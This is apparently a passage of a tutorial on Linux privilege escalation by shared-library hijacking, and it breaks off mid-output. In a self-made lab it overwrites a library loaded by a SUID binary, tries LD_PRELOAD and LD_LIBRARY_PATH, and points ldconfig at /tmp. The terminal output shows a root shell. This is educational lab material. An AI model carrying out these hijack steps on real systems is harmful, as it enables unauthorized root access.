+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ file libcustom.c
+</span></span><span class="line"><span class="cl">libcustom.c: C source, ASCII text
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files$ file libcustom.h
+</span></span><span class="line"><span class="cl">libcustom.h: C source, ASCII text
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files$ file libcustom.o
+</span></span><span class="line"><span class="cl">libcustom.o: ELF 64-bit LSB relocatable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, not stripped
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files$ file libcustom.so
+</span></span><span class="line"><span class="cl">libcustom.so: ELF 64-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0a68a5d5e67fd1490da8bd5a4ea15443708aa8eb, not stripped
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files$ file myexec.c
+</span></span><span class="line"><span class="cl">myexec.c: C source, ASCII text
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files$ file myexec
+</span></span><span class="line"><span class="cl">myexec: ELF 64-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class="o">[</span>sha1<span class="o">]=</span>4200d2a9c3ccff108f83ff6e875db38a37c3ea5c, <span class="k">for</span> GNU/Linux 3.2.0, not stripped
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can read ELF files with the <code>readelf</code> command (<code>-d</code> stands for dynamic):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ readelf -d myexec
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Dynamic section at offset 0x2db0 contains <span class="m">28</span> entries:
+</span></span><span class="line"><span class="cl">  Tag        Type                         Name/Value
+</span></span><span class="line"><span class="cl"> 0x0000000000000001 <span class="o">(</span>NEEDED<span class="o">)</span>             Shared library: <span class="o">[</span>libcustom.so<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> 0x0000000000000001 <span class="o">(</span>NEEDED<span class="o">)</span>             Shared library: <span class="o">[</span>libc.so.6<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> &lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s create an SUID bit to the binary:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ sudo cp myexec /usr/bin/myexec
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files$ sudo chmod u+s /usr/bin/myexec 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can use the find command to search for SUID files:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ find / -type f -perm -u<span class="o">=</span>s 2&gt;/dev/null <span class="p">|</span> xargs ls -l <span class="p">|</span> grep myexec
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root             <span class="m">16728</span> Dec <span class="m">10</span> 12:20 /usr/bin/myexec
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Additionally, we are gonna create another one but <strong>WITHOUT</strong> an SUID bit set:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ sudo cp ~/so-files/myexec /usr/bin/myexec2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Try to execute the <code>/usr/bin/myexec</code> binary:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ /usr/bin/myexec
+</span></span><span class="line"><span class="cl">Message from myexec.c!
+</span></span><span class="line"><span class="cl">Message from libcustom.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As we can see above, the library gets loaded and executed.</p>
+<h1 id="privilege-escalation-via-write-permissions-in-usrlib">Privilege Escalation via Write permissions in /usr/lib</h1>
+<p>Let&rsquo;s navigate to where the malicious library is located:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ <span class="nb">cd</span> ~/so-files/evil
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Startup by adding write permissions to the folder <code>/usr/lib</code>, this is a misconfiguration that should never be done:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ sudo chmod o+w /usr/lib/libcustom.so
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Replace the original library file with the malicious library file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ cp libcustom.so /lib/libcustom.so
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using <code>ldd</code> we can see that the library (<code>libcustom.so</code>) is pointing to the file that we just replaced:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ ldd /usr/bin/myexec
+</span></span><span class="line"><span class="cl">	linux-vdso.so.1 <span class="o">(</span>0x00007fff77127000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libcustom.so <span class="o">=</span>&gt; /lib/libcustom.so <span class="o">(</span>0x00007fdca1271000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libc.so.6 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007fdca137f000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	/lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007fdcb138c000<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we execute the binary, it will load the malicious library:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ /usr/bin/myexec
+</span></span><span class="line"><span class="cl">Message from myexec.c!
+</span></span><span class="line"><span class="cl">I<span class="s1">&#39;m the bad library!
+</span></span></span><span class="line"><span class="cl"><span class="s1">I&#39;</span>m trying to spawn a root shell...
+</span></span><span class="line"><span class="cl">Check your shell!
+</span></span><span class="line"><span class="cl">root@pwn:~/so-files/evil# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,120<span class="o">(</span>lpadmin<span class="o">)</span>,132<span class="o">(</span>lxd<span class="o">)</span>,133<span class="o">(</span>sambashare<span class="o">)</span>,1000 <span class="o">(</span>user<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@pwn:~/so-files/evil# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">root@pwn:~/so-files/evil# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As we can see, we&rsquo;re able to escalate privileges.</p>
+<p>Exit out of the root shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@pwn:~/so-files/evil# <span class="nb">exit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now let&rsquo;s restore the original library:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ sudo cp ~/so-files/libcustom.so /lib/libcustom.so 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Lastly, remove the write permissions from other users and groups:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ sudo chmod o-w /lib/libcustom.so
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-ld_preload">Privilege Escalation via LD_PRELOAD</h1>
+<p>This will <strong>ONLY</strong> work if the binary does <strong>NOT</strong> have a SUID bit set. Let&rsquo;s execute the binary that does <strong>NOT</strong> have a SUID bit set, in this case, <code>myexec2</code> that we created earlier:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ <span class="nv">LD_PRELOAD</span><span class="o">=</span>/home/user/so-files/evil/libcustom.so /usr/bin/myexec2
+</span></span><span class="line"><span class="cl">Message from myexec.c!
+</span></span><span class="line"><span class="cl">I<span class="s1">&#39;m the bad library!
+</span></span></span><span class="line"><span class="cl"><span class="s1">I&#39;</span>m trying to spawn a root shell...
+</span></span><span class="line"><span class="cl">Check your shell!
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As we can see above, it loads the malicious library but it then notices that there&rsquo;s a SUID bit declaration in the malicious library and therefore it doesn&rsquo;t execute the root shell. Now let&rsquo;s try executing a binary with the SUID bit set:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ <span class="nv">LD_PRELOAD</span><span class="o">=</span>/home/user/so-files/evil/libcustom.so /usr/bin/myexec
+</span></span><span class="line"><span class="cl">Message from myexec.c!
+</span></span><span class="line"><span class="cl">Message from libcustom.c
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It doesn&rsquo;t even load the malicious library because the binary itself (<code>myexec</code>) has a SUID bit set. This doesn&rsquo;t work because it has been patched.</p>
+<p>Now let&rsquo;s remove the value in the LD_PRELOAD environment variable with the <code>unset</code> command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ <span class="nb">echo</span> <span class="nv">$LD_PRELOAD</span>
+</span></span><span class="line"><span class="cl">/home/user/so-files/evil/libcustom.so
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ <span class="nb">unset</span> LD_PRELOAD
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ <span class="nb">echo</span> <span class="nv">$LD_PRELOAD</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-ld_library_path">Privilege Escalation via LD_LIBRARY_PATH</h1>
+<p>Let&rsquo;s modify the value of the LD_LIBRARY_PATH environment variable by adding the directory in which the malicious library is located:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ <span class="nb">export</span> <span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>/home/user/so-files/evil/
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ <span class="nb">echo</span> <span class="nv">$LD_LIBRARY_PATH</span>
+</span></span><span class="line"><span class="cl">/home/user/so-files/evil/
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using <code>ldd</code> we can see that library <code>libcustom.so</code> is now pointing to the directory that has the malicious library:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ ldd /usr/bin/myexec
+</span></span><span class="line"><span class="cl">	linux-vdso.so.1 <span class="o">(</span>0x00007ffffe3f3000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libcustom.so <span class="o">=</span>&gt; /home/user/so-files/evil/libcustom.so <span class="o">(</span>0x00007fe052992000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libc.so.6 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007fe052791000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	/lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007fe05299e000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ ldd /usr/bin/myexec2
+</span></span><span class="line"><span class="cl">	linux-vdso.so.1 <span class="o">(</span>0x00007ffde8bb2000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libcustom.so <span class="o">=</span>&gt; /home/user/so-files/evil/libcustom.so <span class="o">(</span>0x00007f7c0f2b0000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libc.so.6 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007f7c0f0af000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	/lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007f7c0f2bc000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we try to do the same things as we did with the environment variable <code>LD_PRELOAD</code>, we can see that the same thing happens:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ /usr/bin/myexec
+</span></span><span class="line"><span class="cl">Message from myexec.c!
+</span></span><span class="line"><span class="cl">Message from libcustom.c
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ /usr/bin/myexec2
+</span></span><span class="line"><span class="cl">Message from myexec.c!
+</span></span><span class="line"><span class="cl">I<span class="s1">&#39;m the bad library!
+</span></span></span><span class="line"><span class="cl"><span class="s1">I&#39;</span>m trying to spawn a root shell...
+</span></span><span class="line"><span class="cl">Check your shell!
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Note: This may not work because it has been patched as well.</p>
+</blockquote>
+<p>Now let&rsquo;s remove the value in the LD_LIBRARY_PATH environment variable with the <code>unset</code> command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ <span class="nb">echo</span> <span class="nv">$LD_LIBRARY_PATH</span>
+</span></span><span class="line"><span class="cl">/home/user/so-files/evil/
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ <span class="nb">unset</span> LD_LIBRARY_PATH
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ <span class="nb">echo</span> <span class="nv">$LD_LIBRARY_PATH</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-ldconfig">Privilege Escalation via LDCONFIG</h1>
+<p>Before continuing make sure that the environments variables that we used before are cleared:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ <span class="nb">echo</span> <span class="nv">$LD_LIBRARY_PATH</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ <span class="nb">echo</span> <span class="nv">$LD_PRELOAD</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The file <code>/etc/ld.so.conf</code> is a configuration file pointing to other configuration files that will help the linker to locate libraries. Read the directories listed in the <code>ldconfig</code> configuration file <code>/etc/ld.so.conf</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ ls -la  /etc/ld.so.conf
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">34</span> Apr <span class="m">14</span>  <span class="m">2020</span> /etc/ld.so.conf
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ cat /etc/ld.so.conf
+</span></span><span class="line"><span class="cl">include /etc/ld.so.conf.d/*.conf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We could list the configuration files that are located in <code>/etc/ld.so.conf.d/</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ ls -la /etc/ld.so.conf.d/
+</span></span><span class="line"><span class="cl">total <span class="m">24</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Aug <span class="m">19</span> 06:30 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">128</span> root root <span class="m">12288</span> Dec <span class="m">10</span> 12:04 ..
+</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root    <span class="m">44</span> Apr <span class="m">14</span>  <span class="m">2020</span> libc.conf
+</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root   <span class="m">100</span> Apr <span class="m">14</span>  <span class="m">2020</span> x86_64-linux-gnu.conf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Create a custom configuration file that points to the <code>/tmp</code> directory, which is a directory that user-privileged users have write permissions on:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ sudo vim /etc/ld.so.conf.d/shouldnt_be_here.conf
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ cat /etc/ld.so.conf.d/shouldnt_be_here.conf
+</span></span><span class="line"><span class="cl">/tmp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Since we have writable permissions in the <code>/tmp</code> directory, we can place or write our malicious shared object there:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ cp libcustom.so /tmp
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ ls -l /tmp/libcustom.so
+</span></span><span class="line"><span class="cl">-rwxrwxr-x <span class="m">1</span> user user <span class="m">16360</span> Dec <span class="m">10</span> 12:38 /tmp/libcustom.so
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We now need to use <strong>ldconfig</strong> to update the linker’s cache so that it will be aware of this new evil library. The cache can be updated with the <code>ldconfig</code> command.</p>
+<p><code>ldd</code> output <strong>BEFORE</strong> executing <code>ldconfig</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ ldd /usr/bin/myexec
+</span></span><span class="line"><span class="cl">	linux-vdso.so.1 <span class="o">(</span>0x00007ffc00ff9000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libcustom.so <span class="o">=</span>&gt; /lib/libcustom.so <span class="o">(</span>0x00007f7b7e24d000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libc.so.6 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007f7b7e05b000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	/lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007f7b7e268000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>ldd</code> output <strong>AFTER</strong> executing <code>ldconfig</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ sudo /usr/sbin/ldconfig
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ ldd /usr/bin/myexec
+</span></span><span class="line"><span class="cl">	linux-vdso.so.1 <span class="o">(</span>0x00007fff9b6cd000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libcustom.so <span class="o">=</span>&gt; /tmp/libcustom.so <span class="o">(</span>0x00007f63a510f000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libc.so.6 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007f63a4f1d000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	/lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007f63a512a000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we execute the binary:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ /usr/bin/myexec
+</span></span><span class="line"><span class="cl">Message from myexec.c!
+</span></span><span class="line"><span class="cl">I<span class="s1">&#39;m the bad library!
